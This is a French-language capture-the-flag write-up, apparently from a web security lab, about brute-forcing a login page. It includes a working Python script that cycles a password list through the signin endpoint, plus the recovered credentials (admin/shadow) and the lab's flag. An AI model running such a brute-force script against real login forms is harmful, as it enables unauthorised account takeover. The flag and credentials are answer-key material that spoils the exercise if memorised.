# Le login

Le login présente 2 champs, un username et un password.
Une méthode courante pour accéder à un compte est le bruteforce.

Ce dernier permettrait d'envoyer rapidement des requêtes avec différents possibilités d'entrées.

En testant l'input on peut voir que l'url change et ressemble à ceci

```
http://192.168.56.101/?page=signin&username=<USERNAME>&password=<PASSWORD>&Login=Login#
```

# Le brute force

Il faut savoir qu'il existe des outils comme Burp suite (Portswigger academy aide pour ceci) ou Hydra pour faire du brute force. Mais pour un login simple on peut faire avec un script python pour comprendre comment cela marche.

## Théorie

Le brute force, comme le nom l'indique, correspond à des tentatives en boucle de combinaisons. Il suffit donc d'avoir une liste de passwords (et / ou une liste d'username si on ne connait pas l'username) et de faire des requêtes vers l'endpoint correspondant. Tant que la requête ne contient pas le statut 200 et/ou le texte attendu alors on continue le brute force.

Pour les listes de mot de passes les plus courants on peut faire références aux listes suivantes sur github: https://github.com/danielmiessler/SecLists/tree/master

## Script

```python
import requests

ip = "localhost"
port = "8080"
url = f"http://{ip}:{port}/" # L'URL de base
password_file = "passwords.txt"
username = "admin"
session = requests.Session()

def brute_force():
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            params = {
                'page': 'signin',
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            response = session.get(url, params=params, timeout=5)
            if "Wrong" not in response.text:
                print(f"\n[SUCCESS] Username: {username} | Password: {password}")
                return
            else:
                print(f"[-] Test: {password}", end="\r")

if __name__ == "__main__":
    brute_force()
```

# Solution

Une fois qu'on a trouvé le password avec le bruteforce
```
Username: admin
Password: shadow
```
On se connecte et on récupère le flag.

## Flag
```
The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```
